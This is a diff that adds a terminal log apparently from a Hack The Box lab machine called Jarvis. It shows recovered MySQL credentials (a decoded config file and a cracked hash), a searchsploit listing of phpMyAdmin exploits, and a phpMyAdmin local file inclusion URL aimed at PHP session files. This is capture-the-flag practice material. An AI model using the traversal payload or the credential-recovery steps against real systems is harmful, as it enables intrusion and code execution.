@@ -1,0 +1,116 @@
+┌─[root@parrot]─[~/hackthebox/jarvis]   
+└──╼ #vi weird-chars                                                             
+┌─[root@parrot]─[~/hackthebox/jarvis]   
+└──╼ #vi mysql_hashes                   
+┌─[root@parrot]─[~/hackthebox/jarvis]   
+└──╼ #vi room.php   
+┌─[root@parrot]─[~/hackthebox/jarvis]   
+└──╼ #mv room.php room.b64.php          
+┌─[root@parrot]─[~/hackthebox/jarvis]   
+└──╼ #base64 -d room.b64.php > room.php 
+base64: invalid input                   
+┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]                                        
+└──╼ #ls                                 
+etc_passwd_file_ways.png  mysql-cred  mysql_hashes  mysql-sql-injection.png  nmap  room.b64.php  room.php  username-password-mysql.png  weird-chars                 
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #vim room.php                       
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #vi room.b64.php                    
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #base64 -d room.b64.php > room.php                                                                                                                             
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #vim room.php                       
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #vi connection.b64.php              
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #base64 -d connection.b64.php > connection.php                               
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #vim connection.php                 
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #cat connection.b64.php             
+PD9waHAKJGNvbm5lY3Rpb249bmV3IG15c3FsaSgnMTI3LjAuMC4xJywnREJhZG1pbicsJ2ltaXNz      
+eW91JywnaG90ZWwnKTsKPz4K                 
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #cat mysql_hashes                   
+2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 
+
+crack = imissyou                         
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #cat connection.php                 
+<?php                                    
+$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');                 
+?>                                       
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #seachsploit phpmyadmin             
+-bash: seachsploit: command not found    
+┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]
+└──╼ #searchsploit phpmyadmin            
+--------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                             |  Path                                  
+                                                                                                                           | (/usr/share/exploitdb/)                
+--------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+WordPress Plugin Portable phpMyAdmin - Authentication Bypass                                                               | exploits/php/webapps/23356.txt         
+XAMPP 3.2.1 & phpMyAdmin 4.1.6 - Multiple Vulnerabilities                                                                  | exploits/php/webapps/32721.txt         
+phpMyAdmin - '/scripts/setup.php' PHP Code Injection                                                                       | exploits/php/webapps/8921.sh           
+phpMyAdmin - 'pmaPWN!' Code Injection / Remote Code Execution                                                              | exploits/php/webapps/8992.php          
+phpMyAdmin - 'preg_replace' (Authenticated) Remote Code Execution (Metasploit)                                             | exploits/php/remote/25136.rb           
+phpMyAdmin - 'tbl_gis_visualization.php' Multiple Cross-Site Scripting Vulnerabilities                                     | exploits/php/webapps/38440.txt         
+phpMyAdmin - (Authenticated) Remote Code Execution (Metasploit)                                                            | exploits/php/remote/45020.rb           
+phpMyAdmin - Client-Side Code Injection / Redirect Link Falsification                                                      | exploits/php/webapps/15699.txt         
+phpMyAdmin - Config File Code Injection (Metasploit)                                                                       | exploits/php/webapps/16913.rb          
+phpMyAdmin 2.11.1 - 'Server_Status.php' Cross-Site Scripting                                                               | exploits/php/webapps/30733.txt         
+phpMyAdmin 2.11.1 - 'setup.php' Cross-Site Scripting                                                                       | exploits/php/webapps/30653.txt         
+phpMyAdmin 2.5.7 - Remote code Injection                                                                                   | exploits/php/webapps/309.c             
+phpMyAdmin 2.6 - 'display_tbl_links.lib.php' Multiple Cross-Site Scripting Vulnerabilities                                 | exploits/php/webapps/25153.txt         
+phpMyAdmin 2.6 - 'select_server.lib.php' Multiple Cross-Site Scripting Vulnerabilities                                     | exploits/php/webapps/25152.txt         
+phpMyAdmin 2.6 - 'theme_left.css.php' Multiple Cross-Site Scripting Vulnerabilities                                        | exploits/php/webapps/25154.txt         
+phpMyAdmin 2.6 - 'theme_right.css.php' Multiple Cross-Site Scripting Vulnerabilities                                       | exploits/php/webapps/25155.txt         
+phpMyAdmin 2.6 - Multiple Local File Inclusions                                                                            | exploits/php/webapps/25156.txt         
+phpMyAdmin 2.6.3-pl1 - Cross-Site Scripting / Full Path                                                                    | exploits/php/webapps/12642.txt         
+phpMyAdmin 2.6.4-pl1 - Directory Traversal                                                                                 | exploits/php/webapps/1244.pl           
+phpMyAdmin 2.7 - 'sql.php' Cross-Site Scripting                                                                            | exploits/php/webapps/27632.txt         
+phpMyAdmin 2.8.1 - Set_Theme Cross-Site Scripting                                                                          | exploits/php/webapps/27435.txt         
+phpMyAdmin 2.9.1 - Multiple Cross-Site Scripting Vulnerabilities                                                           | exploits/php/webapps/29895.txt         
+phpMyAdmin 2.x - 'Export.php' File Disclosure                                                                              | exploits/php/webapps/23640.txt         
+phpMyAdmin 2.x - 'db_create.php?db' Cross-Site Scripting                                                                   | exploits/php/webapps/29058.txt         
+phpMyAdmin 2.x - 'db_operations.php' Multiple Cross-Site Scripting Vulnerabilities                                         | exploits/php/webapps/29059.txt         
+phpMyAdmin 2.x - 'error.php' Cross-Site Scripting                                                                          | exploits/php/webapps/26199.txt         
+phpMyAdmin 2.x - 'queryframe.php' Cross-Site Scripting                                                                     | exploits/php/webapps/26392.txt         
+phpMyAdmin 2.x - 'querywindow.php' Multiple Cross-Site Scripting Vulnerabilities                                           | exploits/php/webapps/29060.txt         
+phpMyAdmin 2.x - 'server_databases.php' Cross-Site Scripting                                                               | exploits/php/webapps/26393.txt         
+phpMyAdmin 2.x - 'sql.php?pos' Cross-Site Scripting                                                                        | exploits/php/webapps/29061.txt         
+phpMyAdmin 2.x - Convcharset Cross-Site Scripting                                                                          | exploits/php/webapps/25330.txt         
+phpMyAdmin 2.x - External Transformations Remote Command Execution                                                         | exploits/php/webapps/24817.txt         
+phpMyAdmin 2.x - Information Disclosure                                                                                    | exploits/php/webapps/22798.txt         
+phpMyAdmin 2.x - Multiple Script Array Handling Full Path Disclosures                                                      | exploits/php/webapps/29062.txt         
+phpMyAdmin 3.0.1 - 'pmd_pdf.php' Cross-Site Scripting                                                                      | exploits/php/webapps/32531.txt         
+phpMyAdmin 3.1.0 - Cross-Site Request Forgery / SQL Injection                                                              | exploits/php/webapps/7382.txt          
+phpMyAdmin 3.2 - 'server_databases.php' Remote Command Execution                                                           | exploits/php/webapps/32383.txt         
+phpMyAdmin 3.3.0 - 'db' Cross-Site Scripting                                                                               | exploits/php/webapps/33060.txt         
+phpMyAdmin 3.3.x/3.4.x - Local File Inclusion via XML External Entity Injection (Metasploit)                               | exploits/php/webapps/18371.rb          
+phpMyAdmin 3.5.2.2 - 'server_sync.php' Backdoor (Metasploit)                                                               | exploits/php/webapps/21834.rb          
+phpMyAdmin 3.5.8/4.0.0-RC2 - Multiple Vulnerabilities                                                                      | exploits/php/webapps/25003.txt         
+phpMyAdmin 3.x - Swekey Remote Code Injection                                                                              | exploits/php/webapps/17514.php         
+phpMyAdmin 4.0.x/4.1.x/4.2.x - Denial of Service                                                                           | exploits/php/dos/35539.txt             
+phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution                                                                   | exploits/php/webapps/40185.py          
+phpMyAdmin 4.7.x - Cross-Site Request Forgery                                                                              | exploits/php/webapps/45284.txt         
+phpMyAdmin 4.8 - Cross-Site Request Forgery                                                                                | exploits/php/webapps/46982.txt         
+phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery                                                                    | exploits/php/webapps/44496.html        
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                | exploits/php/webapps/44924.txt         
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                | exploits/php/webapps/44928.txt         
+phpMyAdmin 4.8.4 - 'AllowArbitraryServer' Arbitrary File Read                                                              | exploits/php/webapps/46041.py          
+phpMyAdmin 4.9.0.1 - Cross-Site Request Forgery                                                                            | exploits/php/webapps/47385.txt         
+phpMyAdmin3 (pma3) - Remote Code Execution                                                                                 | exploits/php/webapps/17510.py          
+--------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result                    
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #http://10.10.10.143/phpmyadmin/index.php?target=db_sql%253f/../../../../../../../../var/lib/php/sessions/sess^C                                               
+┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]
+└──╼ #echo -n http://10.10.10.143/phpmyadmin/index.php?target=db_sql%253f/../../../../../../../../var/lib/php/sessions/sess_sfsafasfasf > notes                     
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #cat notes                          
+http://10.10.10.143/phpmyadmin/index.php?target=db_sql%253f/../../../../../../../../var/lib/php/sessions/sess_sfsafasfasf┌─[root@parrot]─[~/hackthebox/jarvis]      
+└──╼ #cat notes                          
+http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_b1t2ttbinrsj70tj57timo740r4h4ogh                  
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #                                   
